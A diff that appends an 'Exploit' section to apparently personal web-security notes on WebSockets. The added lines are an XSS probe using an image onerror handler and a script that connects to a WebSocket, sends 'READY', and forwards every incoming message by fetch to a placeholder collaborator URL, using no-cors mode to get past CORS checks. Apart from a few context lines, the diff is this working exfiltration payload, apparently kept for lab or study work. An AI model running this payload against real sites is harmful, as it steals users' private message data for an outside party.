@@ -5,4 +5,29 @@
     * online gaming,  
     * live streaming,  
     * real-time updates,  
-    * collaborative editing, and other applications that require instant message delivery.
+    * collaborative editing, and other applications that require instant message delivery.  
+3. Exploit:   
+
+```
+<img src=1 onerror='alert(1)'>
+```  
+
+```
+<script>
+// Create a new WebSocket object and connect to the specified URL
+var ws = new WebSocket('wss://your-websocket-url');
+
+// Set an event listener for when the connection is opened
+ws.onopen = function() {
+// Send a message to the server indicating that the client is ready to receive messages
+ws.send("READY");
+};
+
+// Set an event listener for when a message is received from the server
+ws.onmessage = function(event) {
+// Send the received message data as the request body in an HTTP POST request to the specified collaborator URL
+// Note that the 'no-cors' mode is used to bypass CORS checks
+fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+};
+</script>
+```
